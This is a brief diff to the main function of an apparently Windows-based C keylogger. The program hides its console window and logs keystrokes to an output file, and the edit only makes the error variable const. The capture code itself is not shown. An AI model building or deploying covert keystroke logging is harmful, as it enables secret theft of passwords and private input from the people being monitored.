@@ -9,10 +9,8 @@ const errno_t main(void)
 {
     hideConsoleWindow();
 
-    errno_t err = logKeys(OUTPUT_FILE_NAME);
+    const errno_t err = logKeys(OUTPUT_FILE_NAME);
     if (err) return err;
 
     return 0;
 }
-
-
